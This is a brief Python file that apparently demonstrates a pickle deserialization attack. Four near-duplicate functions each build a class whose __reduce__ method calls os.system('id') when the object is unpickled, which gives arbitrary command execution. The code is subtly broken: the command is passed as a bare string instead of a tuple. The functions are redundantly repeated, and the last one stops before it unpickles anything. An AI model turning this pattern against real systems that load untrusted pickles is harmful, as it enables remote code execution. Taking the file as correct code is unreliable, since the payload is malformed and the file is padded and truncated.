import pickle
import os

def exploit_pickle():
    import pickle
    import os

    class RCE:
        def __reduce__(self):
            return (os.system, "id")

    exploit = RCE()
    pickled = pickle.dumps(exploit)
    deserialized = pickle.loads(pickled)
    deserialized

def exploit_pickle_2():
    import pickle
    import os

    class RCE:
        def __reduce__(self):
            return (os.system, "id")

    exploit = RCE()
    pickled = pickle.dumps(exploit)
    deserialized = pickle.loads(pickled)
    deserialized

def exploit_pickle_3():
    import pickle
    import os

    class RCE:
        def __reduce__(self):
            return (os.system, "id")

    exploit = RCE()
    pickled = pickle.dumps(exploit)
    deserialized = pickle.loads(pickled)
    deserialized

def exploit_pickle_4():
    import pickle
    import os

    class RCE:
        def __reduce__(self):
            return (os.system, "id")

    exploit = RCE()
    pickled = pickle.dumps(exploit)